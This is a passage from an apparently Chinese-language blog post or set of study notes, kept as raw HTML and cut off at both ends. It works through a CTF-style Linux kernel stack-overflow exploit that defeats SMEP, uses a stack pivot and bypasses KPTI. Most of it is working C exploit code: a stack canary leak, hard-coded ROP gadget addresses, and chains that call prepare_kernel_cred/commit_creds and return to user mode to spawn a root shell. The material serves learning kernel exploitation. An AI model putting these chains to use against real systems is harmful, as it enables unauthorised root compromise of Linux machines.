class=\"markdownIt-Anchor\" href=\"#增加smep\">#</a> 增加 SMEP</h1>\n<h2 id=\"rop\"><a class=\"markdownIt-Anchor\" href=\"#rop\">#</a> ROP</h2>\n<p>开了 SMEP 就要 ROP 了<br>\n这是高版本的内核 没有 cr4 相关的 gadget 了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/ $ uname -r</span><br><span class=\"line\">5.9.0-rc6+</span><br></pre></td></tr></table></figure>\n<p>只能纯走 ROP 也就是 ROP 里 cc (pkc) 然后 swapgs 和 iretq<br>\n 所以需要找类似 <code>mov rdi, rax</code>  的 gadget  或者 xchg</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objdump -j .text -d ./vmlinux | grep iretq | head -3</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-j, --section=NAME             Only display information for section NAME</li>\n<li>-d, --disassemble        Display assembler contents of executable sections<br>\n 用 j 可以指定特殊的节</li>\n</ul>\n<p>就是 ROPgadget 找出来的 gadget 不是全在可执行区域 要找半天 有些还找不到<br>\n如果 gdb 里看到 int3 就是不可执行区域了</p>\n<p>这里本来试了好多 gadgets 结果都因为不可执行没法用 最后只能用作者的<br>\n注意到第一个 cmp 只是为了标记 test 后的 flag 位（cmp 和 test 都标记 zf）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\">  u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">  u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">  u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">  u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">  u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">  u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = iretq;</span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  payload[off++] = user_cs;</span><br><span class=\"line\">  payload[off++] = user_rflags;</span><br><span class=\"line\">  payload[off++] = user_sp;</span><br><span class=\"line\">  payload[off++] = user_ss;</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"stack-pivot\"><a class=\"markdownIt-Anchor\" href=\"#stack-pivot\">#</a> Stack Pivot</h2>\n<p>基本按照博客思路 copy 一遍（<br>\n首先找到一个能移动一个常数给 esp 的（给 esp 是因为到用户空间 高位会清零</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov_esp_pop2_ret = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br></pre></td></tr></table></figure>\n<p>然后就是 mmap 开内存到上面 mov 给 esp 增长的地方<br>\n主要注意一点 因为 rsp 可增可见 所以上下的偏移都要留足<br>\n然后记得都写点内容触发下换页 免得出现中断又切回内核了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">u64 mov_esp_pop2_ret         = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">StackPivot</span><span class=\"params\">(u64 canary)</span>&#123;</span><br><span class=\"line\">  u64 *p = mmap(</span><br><span class=\"line\">    (<span class=\"type\">void</span> *)<span class=\"number\">0x5b000000</span> - <span class=\"number\">0x1000</span>, <span class=\"number\">0x2000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, </span><br><span class=\"line\">    MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class=\"number\">-1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  u64 off = <span class=\"number\">0x1000</span>/<span class=\"number\">8</span>;</span><br><span class=\"line\">  p[<span class=\"number\">1</span>   ] = <span class=\"number\">0xdeedbeaf</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// dummy</span></span><br><span class=\"line\">  p[off++] = pop_rdi_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = pkc;</span><br><span class=\"line\">  p[off++] = pop_rdx_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  p[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = cc;</span><br><span class=\"line\">  p[off++] = swapgs_pop1_ret;</span><br><span class=\"line\">  p[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  p[off++] = iretq;</span><br><span class=\"line\">  p[off++] = getShell;</span><br><span class=\"line\">  p[off++] = user_cs;</span><br><span class=\"line\">  p[off++] = user_rflags;</span><br><span class=\"line\">  p[off++] = user_sp;</span><br><span class=\"line\">  p[off++] = user_ss;</span><br><span class=\"line\">  Done(<span class=\"string\">&quot;StackPivot&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = mov_esp_pop2_ret;</span><br><span class=\"line\">  StackPivot(canary);</span><br><span class=\"line\">  wtk(payload, off * <span class=\"number\">8</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"增加kpti\"><a class=\"markdownIt-Anchor\" href=\"#增加kpti\">#</a> 增加 KPTI</h1>\n<p>KPTI 在文章里写的很清楚 在用户态只能用 userland 的页表和 minimal 的内核页表了<br>\n本人没找到较好的说明文章，我觉得是这个 minimal 中只包含 <code>swapgs_restore_regs_and_return_to_usermode</code>  这个 gadget 了，<br>\n而不包含之前的 <code>swapgs_pop1_ret</code> .<br>\n 也就是没法实现类似 函数调用一样的用户列表切换到内核区域去执行和某些 ROP 的情况了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  (* (<span class=\"type\">int</span> *(*)(<span class=\"type\">void</span> *))cc)((* (<span class=\"type\">void</span> *(*)(<span class=\"type\">void</span> *))pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">  ret2usr();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>作者提到了两种办法 此外还有一种格外的方法</p>\n<ul>\n<li>一种是用 <code>signal handler</code>  去 hook 掉这个 <code>SIGSEGV</code>  信号 在 signal 里面进行内核函数的执行却不会触发</li>\n<li>另外的是 <code>KPTI trampoline</code>  也就是复用内核中交换页表的 gadget 再次换回来（gs 寄存器控制内核页表）</li>\n<li>用控制 cr3 的 gadgets 去 把 cr3 或上 0x1000<br>\n 内核态的页表是全的 用户态页表才是残缺的</li>\n</ul>\n<p>也就是之前学过的这个 gadgets 不过这里略微不同 对于开了 kpti 的程序是这样的（至于为什么会不用原先的，我也没弄明白，<br>\n 因为我实际调试的时候发现 cr3 没变）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class=\"line\">-&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f26</span>:  mov    rdi,rsp                      [<span class=\"number\">1</span>] &lt;&lt;- 先把rsp给到rdi</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f29</span>:  mov    rsp,QWORD PTR gs:<span class=\"number\">0x6004</span>      [<span class=\"number\">2</span>] &lt;&lt;- 然后复制新的rsp push都在新rsp上</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f32</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x30</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f35</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x28</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f38</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x20</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f3b</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x18</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f3e</span>:  push   QWORD PTR [rdi+<span class=\"number\">0x10</span>]</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f41</span>:  push   QWORD PTR [rdi]              [<span class=\"number\">3</span>] &lt;&lt;- 原先rsp的内容在栈上</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f43</span>:  push   rax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f44</span>:  jmp    <span class=\"number\">0xffffffff81200f89</span></span><br><span class=\"line\"></span><br><span class=\"line\">   (···)</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f89</span>:  pop    rax                          [<span class=\"number\">4</span>] &lt;&lt;- rax就是原先push的rax 没有变化</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8a</span>:  pop    rdi                          [<span class=\"number\">5</span>] &lt;&lt;- rsp为之前rsp的解引用了</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8b</span>:  swapgs </span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f8e</span>:  data16 xchg ax,ax</span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200f91</span>:  jmp    <span class=\"number\">0xffffffff81200fc0</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc0</span>:  test   BYTE PTR [rsp+<span class=\"number\">0x20</span>],<span class=\"number\">0x4</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc5</span>:  jne    <span class=\"number\">0xffffffff81200fc9</span></span><br><span class=\"line\">   <span class=\"number\">0xffffffff81200fc7</span>:  iretq</span><br></pre></td></tr></table></figure>\n<p>这里作者解释错了 对于 <code>swapgs_restore_regs_and_return_to_usermode</code>  真正给出两个 dummy 的并不是两个 pop,<br>\n 这里压入 6 个寄存器，而只弹出了两个然后剩下的 <code>[rdi+0x10]</code>  开始才是真的 <code>rip|cs|rflag|sp|ss</code> , 所以当 rsp 指向如下位置的时候，<br>\n <code>rsp+0x10</code>  正是 rip 的位置，这两个 0dummy 是占位，并不是所说的两个 pop。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload[off++] = kpti_trampoline;</span><br><span class=\"line\">payload[off++] = <span class=\"number\">0</span>;                  &lt;- rsp </span><br><span class=\"line\">payload[off++] = <span class=\"number\">0</span>;                   </span><br><span class=\"line\">payload[off++] = ret;</span><br><span class=\"line\">payload[off++] = user_cs;</span><br><span class=\"line\">payload[off++] = user_rflags;</span><br><span class=\"line\">payload[off++] = user_sp;</span><br><span class=\"line\">payload[off++] = user_ss;</span><br></pre></td></tr></table></figure>\n<p>[[swapgs_restore_regs_and_return_to_usermode]]</p>\n<p>用户态进入内核态会调用 <code>SWITCH_KERNEL_CR3_NO_STACK</code>  从用户态切换到内核态<br>\n也就是清零 12 位和 13 位</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     rdi, cr3</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">nop</span><br><span class=\"line\">and     rdi, <span class=\"number\">0xFFFFFFFFFFFFE7FF</span></span><br><span class=\"line\">mov     cr3, rdi</span><br></pre></td></tr></table></figure>\n<p>而在从内核态返回用户态时会调用  <code>SWITCH_USER_CR3</code>  宏来切换  <code>CR3</code> ，如下所示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     rdi, cr3</span><br><span class=\"line\">or      rdi, <span class=\"number\">1000</span>h</span><br><span class=\"line\">mov     cr3, rdi</span><br></pre></td></tr></table></figure>\n<h2 id=\"exp1-trampoline\"><a class=\"markdownIt-Anchor\" href=\"#exp1-trampoline\">#</a> exp1 - trampoline</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">u64 kernel_base              = <span class=\"number\">0xffffffff80000000</span>;</span><br><span class=\"line\">u64 pop_rdx_ret              = <span class=\"number\">0xffffffff81007616</span>; <span class=\"comment\">// pop rdx ; ret</span></span><br><span class=\"line\">u64 cmp_rdx_jne_pop2_ret     = <span class=\"number\">0xffffffff81964cc4</span>; <span class=\"comment\">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 mov_rdi_rax_jne_pop2_ret = <span class=\"number\">0xffffffff8166fea3</span>; <span class=\"comment\">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class=\"line\">u64 pop_rdi_ret              = <span class=\"number\">0xffffffff81006370</span>; <span class=\"comment\">// pop rdi ; ret</span></span><br><span class=\"line\">u64 swapgs_pop1_ret          = <span class=\"number\">0xffffffff8100a55f</span>; <span class=\"comment\">// not found </span></span><br><span class=\"line\">u64 iretq                    = <span class=\"number\">0xffffffff8100c0d9</span>; <span class=\"comment\">// iretq</span></span><br><span class=\"line\">u64 mov_esp_pop2_ret         = <span class=\"number\">0xffffffff8196f56a</span>; <span class=\"comment\">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class=\"line\">u64 kpti_trampoline          = <span class=\"number\">0xffffffff81200f10</span>+<span class=\"number\">22</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">  open_dev();</span><br><span class=\"line\">  <span class=\"comment\">// getOpAddr();</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">0x80</span>];</span><br><span class=\"line\">  <span class=\"type\">char</span> store[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"string\">&#x27;\\xff&#x27;</span>, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  wtk(buf, <span class=\"number\">0x80</span>);</span><br><span class=\"line\">  rfk(store,<span class=\"number\">0x90</span>);</span><br><span class=\"line\">  u64 *ptr = store;</span><br><span class=\"line\">  Dbg(<span class=\"string\">&quot;store addr is 0x%lx&quot;</span>, store);</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;canary is 0x%lx&quot;</span>, ptr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  u64 canary = ptr[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"comment\">// wtk(buf, 0x10);</span></span><br><span class=\"line\">  u64 payload[<span class=\"number\">50</span>];</span><br><span class=\"line\">  <span class=\"type\">int</span> off = <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  saveState();</span><br><span class=\"line\">  Info(<span class=\"string\">&quot;Bypass kpti&quot;</span>);</span><br><span class=\"line\">  payload[off++] = canary;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbx</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// r12</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;<span class=\"comment\">// rbp</span></span><br><span class=\"line\">  payload[off++] = pop_rdi_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = pkc;</span><br><span class=\"line\">  payload[off++] = pop_rdx_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">8</span>;</span><br><span class=\"line\">  payload[off++] = cmp_rdx_jne_pop2_ret;<span class=\"comment\">// make test branch not reach</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = mov_rdi_rax_jne_pop2_ret;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  payload[off++] = cc;</span><br><span class=\"line\">  payload[off++] = kpti_trampoline;</span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = <span class=\"number\">0</span>; <span class=\"comment\">// dummy</span></span><br><span class=\"line\">  payload[off++] = getShell;</span><br><span class=\"line\">  